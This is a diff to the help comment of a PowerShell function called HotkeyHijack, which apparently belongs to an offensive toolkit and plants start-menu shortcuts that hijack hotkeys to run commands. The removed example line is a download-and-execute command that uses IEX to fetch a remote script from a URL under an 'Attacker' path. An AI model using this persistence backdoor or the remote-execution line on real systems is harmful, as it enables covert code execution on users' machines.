@@ -6,6 +6,9 @@ Function HotkeyHijack {
 
     Creates a shortcut file (.LNK) in the current user's start menu folder.
     Hijacks given hotkey to run specified command.
+    
+    By default, "CAPS LOCK" is backdoored to launch calculator. The "HotKey" parameter can be specified to execute a custom command.
+    Shown below is the command to backdoor "CTRL+V" to fetch a remote script - in this case, runs calculator.
 
     .PARAMETER HotKey
 
@@ -14,18 +17,7 @@ Function HotkeyHijack {
     .PARAMETER Command
 
     Specifies the command to execute.
-
-    .EXAMPLE
     
-    By default, "CAPS LOCK" is backdoored to launch calculator. The "HotKey" parameter can be specified to execute a custom command.
-    Shown below is the command to backdoor "CTRL+V" to fetch a remote script - in this case, runs calculator.
-    
-    HotkeyHijack -HotKey "CTRL+V" -Command "IEX([net.webclient]::new().downloadstring('https://raw.githubusercontent.com/ShadowOpsIO/Cache/main/Attacker/scripts/calc.txt'))"
-
-    .NOTES
-    
-    More details at https://shadowops.io/posts/hijacking-windows-hotkeys/
-
     #>
 
     Param (
